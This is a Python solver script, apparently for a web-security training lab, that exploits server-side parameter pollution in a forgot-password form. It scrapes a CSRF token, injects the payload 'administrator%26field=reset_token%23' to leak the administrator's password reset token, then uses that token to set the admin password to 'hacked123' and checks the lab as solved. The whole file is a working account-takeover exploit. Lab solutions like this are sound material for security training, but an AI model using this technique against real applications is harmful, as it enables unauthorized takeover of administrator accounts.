import sys
import os
import re
from urllib.parse import quote
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

# the forgot-password form embeds our username into a server-side API call:
#   GET /internal/api/reset-password?username=<input>&field=email
# we can inject extra parameters with %26 (&) and truncate with %23 (#)

# grab a CSRF token from the forgot-password page
page = lab.get("/forgot-password")
soup = BeautifulSoup(page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

# inject field=reset_token and truncate the rest of the query with #
# this makes the internal API return the administrator's reset token
lab.info("Leaking administrator reset token via SSPP...")
payload = "administrator%26field=reset_token%23"
resp = lab.session.post(
    lab.url("/forgot-password"),
    data=f"csrf={csrf}&username={payload}",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
)

# the token is reflected back in the response
match = re.search(r"[0-9a-f]{20,}", resp.text)
if not match:
    lab.warn(f"Could not find token in response: {resp.text}")
    lab.fail("Token extraction failed - inspect the response manually")

token = match.group(0)
lab.success(f"Got admin reset token: {token}")

# use the leaked token to load the reset form and set a new admin password
reset_page = lab.get(f"/forgot-password?reset_token={token}")
soup = BeautifulSoup(reset_page.text, "html.parser")
reset_csrf = soup.find("input", {"name": "csrf"})["value"]

lab.info("Resetting administrator password...")
lab.post(
    "/forgot-password",
    data={
        "csrf": reset_csrf,
        "reset_token": token,
        "new-password-1": "hacked123",
        "new-password-2": "hacked123",
    },
)

lab.check_solved()
